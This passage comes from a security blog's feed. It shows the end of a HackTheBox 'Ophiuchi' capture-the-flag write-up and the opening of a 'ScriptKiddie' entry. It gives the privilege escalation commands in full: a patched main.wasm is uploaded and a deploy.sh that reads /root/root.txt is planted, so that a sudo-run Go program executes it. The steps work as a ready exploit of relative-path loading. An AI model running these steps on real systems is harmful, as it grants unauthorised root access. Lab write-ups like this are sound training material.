+&lt;span class="code-line"&gt;                        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically the program read a webassemply file &lt;code&gt;main.wasm&lt;/code&gt; using a relative path
+and if the file map "info" return &lt;code&gt;1&lt;/code&gt; it run a bash script &lt;code&gt;deploy.sh&lt;/code&gt; also
+using a relative path. We "just" need to create a new &lt;code&gt;main.wasm&lt;/code&gt; that return
+&lt;code&gt;1&lt;/code&gt; and a bash script that give us the root flag.&lt;/p&gt;
+&lt;p&gt;We download main.wasm and "decompile" it using &lt;a href="https://github.com/WebAssembly/wabt"&gt;wabt&lt;/a&gt; and its online &lt;a href="https://webassembly.github.io/wabt/demo/wasm2wat/"&gt;wasm2wat "decompiler"&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Using &lt;a href="https://webassembly.github.io/wabt/demo/wat2wasm/"&gt;wat2wasm&lt;/a&gt; We just change the fourth line &lt;code&gt;(i32.const 0))&lt;/code&gt; to &lt;code&gt;(i32.const 1))&lt;/code&gt; and download the resulting wasm file.
+We upload it on the box in our home folder and create a deploy.sh bash file to display the root flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_Ophiuchi$ scp  test.wasm  admin@10.129.98.255:main.wasm&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@10.129.98.255&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;test.wasm&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@ophiuchi:~$ echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; deploy.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@ophiuchi:~$ chmod +x deploy.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go&lt;/span&gt;
+&lt;span class="code-line"&gt;Ready to deploy&lt;/span&gt;
+&lt;span class="code-line"&gt;d153e100b32fe456e149a86ef6468ac6&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A very interesting box that I would recommend to beginners as it is mostly
+straightforward with no rabbit hole.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="YAML"></category><category term="deserialization"></category><category term="webassembly"></category></entry><entry><title>HTB: ScriptKiddie</title><link href="https://maggick.fr/2021/06/htb-scriptkiddie.html" rel="alternate"></link><published>2021-06-07T10:25:00+02:00</published><updated>2021-06-07T10:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-06-07:/2021/06/htb-scriptkiddie.html</id><summary type="html">&lt;p&gt;&lt;img alt="ScriptKiddie Card" class="align-left" src="/media/2021.06/sk_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/314"&gt;ScriptKiddie&lt;/a&gt; publish on
 February 6, 2021 by
